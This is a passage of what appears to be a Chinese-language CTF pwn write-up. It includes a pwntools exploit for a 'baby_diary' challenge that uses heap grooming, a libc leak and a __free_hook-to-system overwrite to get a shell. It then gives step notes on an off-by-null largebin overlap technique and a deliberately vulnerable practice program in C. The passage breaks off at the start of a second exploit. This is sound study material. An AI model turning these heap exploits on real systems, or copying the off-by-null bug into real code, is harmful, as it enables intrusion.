class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="comment">#sh=process('./baby_diary')</span></span><br><span class="line"><span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">elf=ELF(<span class="string">'./baby_diary'</span>)</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content=<span class="string">'/bin/sh\x00'</span>)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4ba0</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x600</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#9</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#10 x</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#11 x</span></span><br><span class="line">    add(<span class="number">0x47</span>)<span class="comment">#12 x</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#0</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,p8(<span class="number">0</span>))<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#4,5,6,10, 11,13,14</span></span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)+p8(<span class="number">0x10</span>)) <span class="comment">#15  x</span></span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'5555555'</span>)<span class="comment">#16 x</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0x190</span>)+p64(<span class="number">0x101</span>)+p8(<span class="number">0x40</span>))<span class="comment">#</span></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)*<span class="number">6</span>+p8(<span class="number">0</span>)*<span class="number">6</span>)<span class="comment">#16</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">8</span>+p8(<span class="number">0</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#17+23</span></span><br><span class="line">        add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>)<span class="comment">#0</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'1'</span>*<span class="number">7</span>)<span class="comment">#17</span></span><br><span class="line"><span class="comment">#    free(14)</span></span><br><span class="line"><span class="comment">#    add(0x37,p64(1)+p8(0)*8)</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>)                     </span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">3</span>)    </span><br><span class="line">    show(<span class="number">17</span>)</span><br><span class="line">    addr=u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-391</span></span><br><span class="line">    log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line">    malloc=addr<span class="number">-0x10</span></span><br><span class="line">    log.info(<span class="string">'malloc_hook:'</span>+hex(malloc))</span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc,num=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">multi libc results:</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[!] you can choose it by hand</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'22222'</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p64(x.dump(<span class="string">'__free_hook'</span>)))<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x57</span>)<span class="comment">#17</span></span><br><span class="line">    add(<span class="number">0x57</span>,p64(x.dump(<span class="string">'system'</span>))) <span class="comment">#18</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#add(0x57,'')#18</span></span><br><span class="line"> <span class="comment">#   free(1)</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sh=process(<span class="string">"./baby_diary"</span>)</span><br><span class="line">        <span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn2()</span><br><span class="line">            gdb.attach(sh)</span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><h2 id="直接法"><a href="#直接法" class="headerlink" title="直接法"></a>直接法</h2><p>直接法我是在wjh爷爷的博客上了解的<a href="http://blog.wjhwjhn.com/archives/193/" target="_blank" rel="noopener">http://blog.wjhwjhn.com/archives/193/</a></p><p>这个方法有关弊端，如果题目<code>\n</code>不能替换‘\x00’就需要题目有show功能，否则还是得爆。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>1.创造4个大于tcache的最大值并且在largebin范围内的chunk A、B、C、D。让B、C相邻外，其他chunk 间都有隔离块隔离同时chunk C的地址为末位为<code>0x00</code>。</p><p>2.按照顺序释放A、C、D，形成largebins 链表。</p><p><img src="image-20210713184123575.png" alt="image-20210713184123575"></p><p>3.释放chunk B，让chunk B和chunk C产生合并。</p><p><img src="image-20210713184333651.png" alt="image-20210713184333651"></p><p>4.创建大小比原来chunk B多0x20size 的new chunk B。让old chunk C的 old fd 与old bk保留在new chunk 底部。创建大小比原来chunk C少0x20size 的new chunk C。</p><p>5.将chunk A和chunk B复原。</p><p><img src="image-20210713185405449.png" alt="image-20210713185405449"></p><p>6.按照顺序释放 A、new C、D，形成largebins 链表。</p><p>7.修改chunk A bf 值为old chunk C addr。修改chunk D fd 值为old chunk C addr。</p><p>8.通过new chunk B修改  old chunk C size 为fake size。通过new chunk C 修改隔离chunk的<code>prevsize</code>值为fake size，</p><p> <img src="image-20210713190210228.png" alt="image-20210713190210228"></p><p>9.free 隔离chunk即出现合并。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>没有找到合适的，于是选来自nopnoping爷爷博客的例题，源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"><span class="keyword">long</span> *<span class="built_in">point</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">&#125;chunks[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Size?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;<span class="built_in">size</span>);</span><br><span class="line">chunks[index].<span class="built_in">point</span>=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"malloc error!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">chunks[index].<span class="built_in">size</span>=<span class="built_in">size</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"It's blank!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(chunks[index].<span class="built_in">point</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"It's blank!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p=chunks[index].<span class="built_in">point</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"content:"</span>);</span><br><span class="line">p[<span class="built_in">read</span>(<span class="number">0</span>,chunks[index].<span class="built_in">point</span>,chunks[index].<span class="built_in">size</span>)]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"It's blank!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(chunks[index].<span class="built_in">point</span>);</span><br><span class="line">chunks[index].<span class="built_in">point</span>=<span class="number">0</span>;</span><br><span class="line">chunks[index].<span class="built_in">size</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"1) add a chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2) show content"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3) edit a chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"4) delete a chunk"</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> choice;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Welcome to my off by null vuln vulnerability exercise."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wish you will play happy!"</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choice);</span><br><span class="line"><span class="keyword">switch</span>(choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">show();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">edit();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">delete</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 